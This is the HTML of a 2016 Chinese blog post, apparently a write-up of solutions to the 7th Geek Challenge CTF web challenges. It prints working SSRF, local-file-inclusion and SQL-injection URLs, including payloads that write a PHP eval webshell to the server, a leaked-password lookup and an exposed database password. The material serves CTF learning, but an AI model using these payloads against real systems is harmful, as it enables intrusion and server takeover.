@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    
+
+    <title>
+      第七届极客大挑战 | Hello,C 
+    </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+    
+
+    <meta name="description" content="0x01、Social Engineering(社工)有一天我捕了一只狗师傅，嘴里叼着一张纸，纸上赫然写着:http://web.sycsec.com/36da077bd47665ae/ (解题不需要联系题目邮箱和电话号码，请不要试图联系题目的邮箱和电话号码)第一次碰到社工题，套路不咋懂，比较尴尬。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第七届极客大挑战 | Hello,C">
+<meta property="og:url" content="http://yoursite.com/2016/10/29/第七届极客大挑战/index.html">
+<meta property="og:site_name" content="Hello,C">
+<meta property="og:description" content="0x01、Social Engineering(社工)有一天我捕了一只狗师傅，嘴里叼着一张纸，纸上赫然写着:http://web.sycsec.com/36da077bd47665ae/ (解题不需要联系题目邮箱和电话号码，请不要试图联系题目的邮箱和电话号码)第一次碰到社工题，套路不咋懂，比较尴尬。">
+<meta property="og:image" content="http://p1.bpimg.com/567571/9daaf05e07cfd16c.png">
+<meta property="og:image" content="http://p1.bpimg.com/567571/0b1114aa7ba1124e.png">
+<meta property="og:image" content="http://i1.piimg.com/567571/85abbf195195c129.jpg">
+<meta property="og:image" content="http://i1.piimg.com/567571/64e09893dea6aef8.png">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/360%E6%88%AA%E5%9B%BE20161029151830168.jpg">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/596.jpg">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/87.jpg">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/360%E6%88%AA%E5%9B%BE20161029154147956.jpg">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/09.jpg">
+<meta property="og:updated_time" content="2016-10-29T10:19:16.187Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="第七届极客大挑战 | Hello,C">
+<meta name="twitter:description" content="0x01、Social Engineering(社工)有一天我捕了一只狗师傅，嘴里叼着一张纸，纸上赫然写着:http://web.sycsec.com/36da077bd47665ae/ (解题不需要联系题目邮箱和电话号码，请不要试图联系题目的邮箱和电话号码)第一次碰到社工题，套路不咋懂，比较尴尬。">
+<meta name="twitter:image" content="http://p1.bpimg.com/567571/9daaf05e07cfd16c.png">
+    
+    
+    
+      <link rel="icon" type="image/x-icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
+
+</head>
+<body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+
+<header class="panel-cover panel-cover--collapsed">
+
+
+  <div class="panel-main">
+
+  
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        
+
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">Hello,C</a></h1>
+        <hr class="panel-cover__divider" />
+
+        
+        <p class="panel-cover__description">
+          一个小白的独白！
+        </p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
+              
+                
+                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
+              
+                
+                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
+              
+                
+                <li class="navigation__item"><a href="/links" title="" class="">友情链接</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
+
+
+
+<nav class="cover-navigation navigation--social">
+  <ul class="navigation">
+
+    
+      <!-- Github -->
+      <li class="navigation__item">
+        <a href="https://github.com/zjwfc?tab=activity" title="Huno on GitHub">
+          <i class='icon icon-social-github'></i>
+          <span class="label">GitHub</span>
+        </a>
+      </li>
+    
+
+    <!-- China social icon -->
+    
+    
+      <li class="navigation__item">
+        <a href="https://www.douban.com/" title="">
+          <i class='icon cs-icon-douban'></i>
+          <span class="label">douban</span>
+        </a>
+      </li>
+
+      <li class="navigation__item">
+        <a href="http://weibo.com/5664757301/profile?topnav=1&wvr=6&is_all=1" title="">
+          <i class='icon cs-icon-weibo'></i>
+          <span class="label">Weibo</span>
+        </a>
+      </li>
+
+ 
+
+
+
+  </ul>
+</nav>
+
+
+
+
+
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">第七届极客大挑战</h1>
+
+    
+
+    <div class="post-meta">
+      <time datetime="2016-10-29" class="post-meta__date date">2016-10-29</time> 
+
+      <span class="post-meta__tags tags">
+
+          
+
+          
+             &#8226; 标签:
+            <font class="tags">
+              <a class="tags-link" href="/tags/writeup/">writeup</a>
+            </font>
+          
+
+      </span>
+    </div>
+    
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <h3 id="0x01、Social-Engineering-社工"><a href="#0x01、Social-Engineering-社工" class="headerlink" title="0x01、Social Engineering(社工)"></a>0x01、Social Engineering(社工)</h3><p>有一天我捕了一只狗师傅，嘴里叼着一张纸，纸上赫然写着:<a href="http://web.sycsec.com/36da077bd47665ae/" target="_blank" rel="external">http://web.sycsec.com/36da077bd47665ae/</a> (解题不需要联系题目邮箱和电话号码，请不要试图联系题目的邮箱和电话号码)<br>第一次碰到社工题，套路不咋懂，比较尴尬。<br><a id="more"></a><br><img src="http://p1.bpimg.com/567571/9daaf05e07cfd16c.png" alt=""></p>
+<p>基本套路就是通过数据库查取泄露的密码，可见平时收集社工库的重要性啊。挂VPN访问社工库<a href="http://s.70sec.com/" target="_blank" rel="external">http://s.70sec.com/</a> 得到邮箱名字为肖力。<br>然后提示说是有贴吧，还提示了手机账号，以为是登录到贴吧账号里面，结果一直都不成功，尴尬。<br>同学提示直接搜索肖力吧啊，我去，还真有，原谅我不经常玩贴吧。找到一篇关于提示的帖子，加了qq然后又是各种尝试，发现注册了一个网站，进过whois反查，又找到他注册网址的一个谷歌邮箱，查看邮箱就找见了flag，过程确实有点曲折和脑洞啊。</p>
+<h3 id="0x02、php-is-fun"><a href="#0x02、php-is-fun" class="headerlink" title="0x02、php_is_fun"></a>0x02、php_is_fun</h3><p>phpinfo() is disabled; <a href="http://game.sycsec.com:50084/" target="_blank" rel="external">http://game.sycsec.com:50084/</a><br>需要getshell,主要是看file_put_contents、file_get_contents函数。</p>
+<pre><code>&lt;?php
+if(isset($_GET) &amp;&amp; !empty($_GET)){
+    $url = $_GET[&apos;file&apos;];
+    $path = &quot;upload/&quot;.$_GET[&apos;path&apos;];
+}else{
+    show_source(__FILE__);
+    exit();
+}
+
+if(strpos($path,&apos;..&apos;) &gt; -1){
+    die(&apos;SYCwaf!&apos;);
+}
+
+if(strpos($url,&apos;http://127.0.0.1/&apos;) === 0){
+    file_put_contents($path, file_get_contents($url));
+    echo &quot;console.log($path update successed!)&quot;;
+}else{
+    echo &quot;Hello.Geeker&quot;;
+}
+?&gt;
+</code></pre><p>又是进行代码审计<br>先get方式得到file和path参数，再将file参数赋值给$url，path的值和upload/拼接赋值给$path。strpos过滤掉了path的..防止目录遍历以及验证url必须为 <a href="http://127.0.0.1/，" target="_blank" rel="external">http://127.0.0.1/，</a> 然后从$url获取内容写入到path之中</p>
+<blockquote>
+<p>file_put_contents():把一个字符串写入文件中<br>file_get_contents():将整个文件读入一个字符串</p>
+</blockquote>
+<p>首先构造<a href="http://game.sycsec.com:50084/?file=http://127.0.0.1/&amp;path=11.php" target="_blank" rel="external">http://game.sycsec.com:50084/?file=http://127.0.0.1/&amp;path=11.php</a><br><img src="http://p1.bpimg.com/567571/0b1114aa7ba1124e.png" alt=""><br>那我们继续访问上传的地址<a href="http://game.sycsec.com:50084/upload/11.php" target="_blank" rel="external">http://game.sycsec.com:50084/upload/11.php</a>, 可以看见还是刚才的源码</p>
+<p><img src="http://i1.piimg.com/567571/85abbf195195c129.jpg" alt=""><br>可以判断出$url访问了 <a href="http://127.0.0.1/" target="_blank" rel="external">http://127.0.0.1/</a> 后将读取到的内容写入到11.php中了，那么我们可以构造一句话,让它读取到path这个php中，继而getshell</p>
+<pre><code>http://game.sycsec.com:50084/?file=http://127.0.0.1/&amp;path=&lt;?php eval($_POST[‘shell’]); ?&gt;&amp;path=11.php
+</code></pre><p>使用此方法是上传成功了，但是却用菜刀连不上，访问的话还是原来的源代码。<br>原来ssrf做了二次编码，那么我们只能构造二次编码进行绕过了。由于服务器在接收GET参数的时候本身就会对参数进行一次URL解码 , 因此需要对file参数进行两次URL编码然后再进行传递,其实这里有问题就只是空格,空格URL编码后为%20,但是因为这里进行了两次URL解码因此需要将空格的URL编码再进行编码最后再传递,其实也只需要对%20中的%进行URL编码是%25</p>
+<pre><code>http://game.sycsec.com:50084/?file=http://127.0.0.1/?file=http://127.0.0.1/%26path%3D&lt;?php%2520eval($_POST[%27shell%27]);?&gt;&amp;path=1.php
+</code></pre><p>这样我们已经一句话成功写入，可以使用菜刀连入拿到flag了。</p>
+<h3 id="0x03、单身二十年，手速一定快"><a href="#0x03、单身二十年，手速一定快" class="headerlink" title="0x03、单身二十年，手速一定快"></a>0x03、单身二十年，手速一定快</h3><p><a href="http://web.sycsec.com/0b3a7c6ca7f1f2e6/" target="_blank" rel="external">http://web.sycsec.com/0b3a7c6ca7f1f2e6/</a> 狗师傅说这道题要跑跑脚本呢:) 跑出后找qq:3245037532 推荐一下python学习链接啦:)<a href="http://pan.baidu.com/s/1hsdTlgo" target="_blank" rel="external">http://pan.baidu.com/s/1hsdTlgo</a></p>
+<p><img src="http://i1.piimg.com/567571/64e09893dea6aef8.png" alt=""></p>
+<p>由于有时间限制，所以得使用python进行提交，考察requests库</p>
+<pre><code>#!usr/bin/env python
+# -*-coding=utf-8 -*-
+
+import requests
+
+s = requests.session()
+url1 = &apos;http://web.sycsec.com/0b3a7c6ca7f1f2e6/&apos;
+url2 = &apos;http://web.sycsec.com/0b3a7c6ca7f1f2e6/judge.php&apos;
+html = s.get(url1).content
+h = html.count(&apos;@&apos;)-1
+post = {&apos;mytext&apos;:h}
+a = s.post(url2,data = post)
+print a.content.decode(&apos;utf-8&apos;)
+</code></pre><p>这样我们实现了脚本post提交数据的请求</p>
+<p>学习链接：<a href="https://my.oschina.net/yangyanxing/blog/280029" target="_blank" rel="external">https://my.oschina.net/yangyanxing/blog/280029</a><br>        <a href="http://docs.python-requests.org/zh_CN/latest/user/quickstart.html" target="_blank" rel="external">http://docs.python-requests.org/zh_CN/latest/user/quickstart.html</a></p>
+<h3 id="0x04、compress300"><a href="#0x04、compress300" class="headerlink" title="0x04、compress300"></a>0x04、compress300</h3><p>是master go就解压300层 <a href="http://down.sycsec.com/programme/300" target="_blank" rel="external">http://down.sycsec.com/programme/300</a></p>
+<p>要解压三百次啊，天啊，只能是脚本运行了啊</p>
+<pre><code>#!usr/bin/env python
+# -*- coding = utf-8 -*-
+
+import zipfile
+import tarfile
+
+for i in range (1,301)[::-1]:
+    path = str(i)
+    try:
+        tar = ratfile.open(path)
+        tar.extractall()
+    except:
+        pass
+    try:
+        zip = zipfile.ZipFile(path)
+        zip.extractall()
+    except:
+        pass
+</code></pre><p>这样就可以解压300次得到flag</p>
+<p>学习链接：<a href="http://wolfchen.blog.51cto.com/2211749/1290229" target="_blank" rel="external">http://wolfchen.blog.51cto.com/2211749/1290229</a><br>        <a href="http://www.cnblogs.com/zhengyuxin/articles/1956178.html" target="_blank" rel="external">http://www.cnblogs.com/zhengyuxin/articles/1956178.html</a></p>
+<h3 id="0x05、你是人间四月天"><a href="#0x05、你是人间四月天" class="headerlink" title="0x05、你是人间四月天"></a>0x05、你是人间四月天</h3><p>岁月不堪数 故人不知处 最是人间留不住 <a href="http://game.sycsec.com:50080/9392d16bb9fbda00/" target="_blank" rel="external">http://game.sycsec.com:50080/9392d16bb9fbda00/</a></p>
+<p><img src="http://obh1qcqek.bkt.clouddn.com/360%E6%88%AA%E5%9B%BE20161029151830168.jpg" alt=""></p>
+<p>修改<a href="http://game.sycsec.com:50080/9392d16bb9fbda00/index.php?sel=yes" target="_blank" rel="external">http://game.sycsec.com:50080/9392d16bb9fbda00/index.php?sel=yes</a><br><img src="http://obh1qcqek.bkt.clouddn.com/596.jpg" alt=""></p>
+<p>修改后还是没有什么卵用。<br>相信我是百度，所以我们http请求中referer头表示来自哪个链接，加了之后并没有什么卵用，还有就是host，表示主机，那就试着改一下吧，结果还真是改host<br><img src="http://obh1qcqek.bkt.clouddn.com/87.jpg" alt=""></p>
+<p>我们继续访问它的连接即可拿到flag<br><img src="http://obh1qcqek.bkt.clouddn.com/360%E6%88%AA%E5%9B%BE20161029154147956.jpg" alt=""></p>
+<h3 id="0x06、狗师傅的计算器"><a href="#0x06、狗师傅的计算器" class="headerlink" title="0x06、狗师傅的计算器"></a>0x06、狗师傅的计算器</h3><p>狗师傅说fuck my brain:)。<a href="http://game.sycsec.com:50085/" target="_blank" rel="external">http://game.sycsec.com:50085/</a></p>
+<pre><code>+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ +++++ +++++ +++++ .&lt;+++ +[-&gt;- ---&lt;] &gt;--.+ +++++ +.--- ----- -.&lt;++ +[-&gt;+ ++&lt;]&gt; +++.- -.--- ----- .&lt;+++ ++++[ -&gt;--- ----&lt; ]&gt;--- ---.&lt; +++++ +++[- &gt;++++ ++++&lt; ]&gt;++. ----- ---.+ +++++ ++.&lt;
+</code></pre><p>一进来就是一个brainfuck加密，使用在线解密<a href="http://esoteric.sange.fi/brainfuck/impl/interp/i.html" target="_blank" rel="external">http://esoteric.sange.fi/brainfuck/impl/interp/i.html</a> 进行解密，得到welcome.php</p>
+<p><a href="http://game.sycsec.com:50085/welcome.php" target="_blank" rel="external">http://game.sycsec.com:50085/welcome.php</a> 看到做题页面<br><img src="http://obh1qcqek.bkt.clouddn.com/09.jpg" alt=""><br>经过查看发现有robots.txt</p>
+<pre><code>&lt;?php
+//竟然知道brain fuck 和 robots.txt 狗师傅咬你哦 -.-
+//这时候狗师傅叼着下面的源码冲到你的面前，审啊，审不出就咬
+//-.-
+$num1=$_REQUEST[&apos;num1&apos;];
+$num2=$_REQUEST[&apos;num2&apos;];
+$oper=$_REQUEST[&apos;oper&apos;];
+$str=$_GET[&apos;syc&apos;];
+
+$pos=strpos($str,&apos;/&apos;);    
+if(0===$pos)
+{
+    die(&apos;Do not hack master go :)&apos;);
+}
+if(strpos($str ,&apos;..&apos;) &gt; -1 || strops($str , &apos;=/&apos;) &gt; -1){
+die(&apos;Do not hack master go :)&apos;); 
+}
+$result=include($str . &quot;.php&quot;);
+//echo $str;
+$res=0;
+switch($oper){
+    case &quot;+&quot;:
+        $res=$num1+$num2;
+        break;
+    case &quot;-&quot;:
+        $res=$num1-$num2;
+        break;
+    case &quot;*&quot;:
+        $res=$num1*$num2;
+        break;
+    case &quot;/&quot;:
+        $res=$num1/$num2;
+        break;
+    default:
+        echo &apos;&lt;br/&gt;no data!&apos;;
+}
+echo &apos;&lt;br/&gt;result=&apos;.$res ;
+?&gt; 
+&lt;br/&gt;
+&lt;a href=&quot;syc.php&quot;&gt;算对了你也找不到flag -.-&lt;/a&gt;
+&lt;br/&gt;
+&lt;a
+href=&quot;robot.txt&quot;&gt;你对php实现计算器感兴趣么,来这里看看
+:) &lt;/a&gt;
+</code></pre><p>发现有个include()，可能含有文件包含漏洞，并且strpos()函数过滤掉了..和/，不能够进行目录遍历，那么试试我们的php伪协议php://filter</p>
+<p><a href="http://game.sycsec.com:50085/syc.php" target="_blank" rel="external">http://game.sycsec.com:50085/syc.php</a> ，源码提示flag就在此页，于是我们在此构造</p>
+<pre><code>http://game.sycsec.com:50085/result.php?syc=php://filter/convert.base64-encode/resource=syc.php
+</code></pre><p>结果提示，no data!,再看看源码，发现$result=include($str . “.php”);已经添加了.php的后缀名了，于是我们只要去掉后缀名即可</p>
+<pre><code>http://game.sycsec.com:50085/result.php?syc=php://filter/convert.base64-encode/resource=syc
+</code></pre><p>找到了base64加密的代码，进行解密即可</p>
+<pre><code>5L2g55yL5LiN5Yiw5oiRIC0uLSAg5om+5LiN5YiwZmxhZ+WwseWOu+aJk+eLl+W4iOWCheWQpyA6KTxici8+PGJyLz48YnIvPjxici8+PGJyLz48YnIvPjxici8+PGJyLz48YnIvPjxici8+PGJyLz48YnIvPjxici8+PGJyLz48YnIvPjxici8+PGJyLz48YnIvPjxici8+PGJyLz48YnIvPjxici8+PGJyLz48YnIvPjxici8+PGJyLz48YnIvPjxici8+PGJyLz48YnIvPjxici8+PGJyLz48YnIvPjxici8+PGJyLz48YnIvPjxici8+PGJyLz4K5L2G5piv5ZCs6K+0ZmxhZ+WwseWcqOi/meS4qumhtemdouWViu+8jOaAjuS5iOaLv+WIsOWug+WRou+8nwo8P3BocCAKLy9TWUN7cGhwX2lTX0Z1bn0KPz4K
+</code></pre><h3 id="0x07、撸啊撸"><a href="#0x07、撸啊撸" class="headerlink" title="0x07、撸啊撸"></a>0x07、撸啊撸</h3><p>喜欢玩LOL么 <a href="http://lol.sycsec.com" target="_blank" rel="external">http://lol.sycsec.com</a> 提示:运算符优先级</p>
+<p>进入里面是一些图片的下载，没有什么线索，当我们点击下载的时候，这个下载链接看着有点意思啊，会不会有任意文件下载的可能呢？</p>
+<pre><code>http://lol.sycsec.com/download.php?url=images/9.jpg
+</code></pre><p>构造后面的url可以下载到很多的敏感文件display.php、download.php等</p>
+<pre><code>http://lol.sycsec.com/download.php?url=download.php
+http://lol.sycsec.com/download.php?url=display.php
+</code></pre><p>这是diaplay.php的，可以发现含有config.inc.php</p>
+<pre><code>&lt;?php
+error_reporting(0);
+$config = include &quot;config.inc.php&quot;;
+
+if (isset($_GET[&apos;id&apos;])){
+    $id = intval($_GET[&apos;id&apos;]);
+    $conn = mysqli_connect($config[&apos;db_host&apos;],$config[&apos;db_user&apos;],$config[&apos;db_pwd&apos;],$config[&apos;database&apos;]);
+
+    if (mysqli_connect_errno($conn)){
+        die(&quot;Can not connect mysql!&quot;.mysqli_connect_error());
+    }
+
+    $sql = &quot;SELECT path FROM images WHERE id={$id}&quot;;
+    $result = mysqli_query($conn,$sql);
+    $row = mysqli_fetch_array($result,MYSQLI_ASSOC);
+    $path = $row[&apos;path&apos;];
+} else{
+    die(&apos;Missing parameter id&apos;);
+}
+</code></pre><p>?&gt;</p>
+<p>继续下载config.inc.php</p>
+<pre><code>&lt;?php
+return array(
+    &apos;db_host&apos; =&gt; &apos;localhost&apos;,
+    &apos;db_user&apos; =&gt; &apos;syclol&apos;,
+    &apos;db_pwd&apos; =&gt; &apos;fJBGpEfu3wWLvNHB&apos;,
+    &apos;database&apos; =&gt; &apos;syclol&apos;
+);
+</code></pre><p>可以看见是链接数据库的，经过抓包发现还有个api.php，应该是链接数据库的</p>
+<pre><code>&lt;?php
+error_reporting(0);
+include &quot;json.php&quot;;
+$config = include &quot;config.inc.php&quot;;
+
+if (isset($_GET[&apos;img_first&apos;]) and isset($_GET[&apos;img_num&apos;])){
+    $img_first = $_GET[&apos;img_first&apos;];
+    $img_num = $_GET[&apos;img_num&apos;];
+    $conn = mysqli_connect($config[&apos;db_host&apos;],$config[&apos;db_user&apos;],$config[&apos;db_pwd&apos;],$config[&apos;database&apos;]);
+
+    if (mysqli_connect_errno($conn)){
+        die(&quot;Can not connect mysql!&quot;.mysqli_connect_error());
+    }
+
+    $check = is_numeric($img_num) and is_numeric($img_first);
+
+    if (!$check){
+        $img_num = intval($img_num);
+        $img_first = intval($img_first);
+    }
+
+    $sql = &quot;SELECT * FROM images LIMIT $img_first,$img_num&quot;;
+    $result = mysqli_query($conn,$sql);
+
+    $i = 0;
+    while($row=mysqli_fetch_array($result,MYSQLI_ASSOC)){
+        $rows[$i] = $row;
+        $i++;
+    }
+    $json = new Services_JSON();
+    echo $json-&gt;encode(array(&apos;result&apos;=&gt;$rows));
+    //echo json_encode(array(&apos;result&apos;=&gt;$rows),JSON_UNESCAPED_SLASHES);
+}else {
+    die(&quot;Missing parameter img_first or img_num&quot;);
+}
+</code></pre><p>我们看到这个<strong><em>SELECT </em> FROM images LIMIT $img_first,$img_num*</strong>可能存在sql注入，还提示是运算符优先级</p>
+<pre><code>$check = is_numeric($img_num) and is_numeric($img_first);  #is_numeric()检测变量是否为数字或者数字字符串
+
+    if (!$check){
+        $img_num = intval($img_num);
+        $img_first = intval($img_first);
+    }
+</code></pre><p>既然是程序和用户交互的地方，因为这种地方在参数传递的时候没有对参数的类型和正确性进行判断，那就会留给我们利用的余地。<br>根据运算优先级知道，$check 这个变量的值就只取决于 $img_num.所以只要满足$img_num，就相当于$check也满足了。而剩下的$img_first就可以用来构造我们所需要的注入语句了。</p>
+<p>查看数据库的基本路径</p>
+<pre><code>http://lol.sycsec.com/api.php?img_num=0&amp;img_first=0 union select 1,@@datadir--+
+
+{&quot;result&quot;:[{&quot;id&quot;:&quot;1&quot;,&quot;path&quot;:&quot;\/var\/lib\/mysql\/&quot;}]}
+</code></pre><p>可以看到目录/var/lib/mysql，由此可看服务器为Linux系统</p>
+<p>接下来使用默认路径写入我们的一句话进去，使用菜刀连接</p>
+<pre><code>http://lol.sycsec.com/api.php?img_num=0&amp;img_first=0%20union%20select%201,%22%3C?php%20eval($_POST[%27123456%27]);?%3E%22%20into%20outfile%20%22/var/www/html/images/123456.php%22--+
+</code></pre><p>使用菜刀可进行连接拿到flag</p>
+<h3 id="0x08、皓宝宝的留言板"><a href="#0x08、皓宝宝的留言板" class="headerlink" title="0x08、皓宝宝的留言板"></a>0x08、皓宝宝的留言板</h3><p><a href="http://web.sycsec.com/42e1f42bcf3c0cfc/" target="_blank" rel="external">http://web.sycsec.com/42e1f42bcf3c0cfc/</a> 听说有很多妹子在这里写下她们对皓宝宝的爱慕之情<br>学习资料：<a href="https://github.com/l3m0n/XSS-Filter-Evasion-Cheat-Sheet-CN" target="_blank" rel="external">https://github.com/l3m0n/XSS-Filter-Evasion-Cheat-Sheet-CN</a></p>
+<h3 id="0x09、Only-number-never-lies-to-you"><a href="#0x09、Only-number-never-lies-to-you" class="headerlink" title="0x09、Only number never lies to you"></a>0x09、Only number never lies to you</h3><p><a href="http://game.sycsec.com:50082/" target="_blank" rel="external">http://game.sycsec.com:50082/</a>  Only number never lies to you.  Tip:dir<br>进入链接就只有一个时钟在那一直走一直走</p>
+
+  </section>
+
+ 
+  
+
+<section class="post-comments">
+
+    <div class="ds-thread" data-thread-key="2016/10/29/第七届极客大挑战/"></div>
+
+    <script type="text/javascript">
+      var duoshuoQuery = {short_name:"zjwfc"};
+      (function() {
+        var ds = document.createElement('script');
+        ds.type = 'text/javascript';ds.async = true;
+        ds.src = '//static.duoshuo.com/embed.js';
+        ds.charset = 'UTF-8';
+        (document.getElementsByTagName('head')[0] 
+        || document.getElementsByTagName('body')[0]).appendChild(ds);
+      })();
+    </script> 
+
+</section>
+
+
+</article>
+
+
+
+
+            <footer class="footer">
+
+    <span class="footer__copyright">&copy; 2017-2018. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a></span>
+    
+</footer>
+
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<script type="text/javascript">
+		window.onload = function(){
+			var config = {
+				vx: 4,
+				vy:  4,
+				height: 2,
+				width: 2,
+				count: 100,
+				color: "121, 162, 185",
+				stroke: "100,200,180",
+				dist: 6000,
+				e_dist: 20000,
+				max_conn: 10
+			}
+			CanvasParticle(config);
+		}
+</script>
+<script type="text/javascript" src="js/canvas-particle.js"></script>
+
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+
+
+<span id="busuanzi_container_page_pv">
+  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+</span>
+        </div>
+    </div>
+
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
+    
+
+    
+
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+
+
+
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
+            });
+        });
+    </script>
+
+
+    
+    
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+
+</body>
+</html>
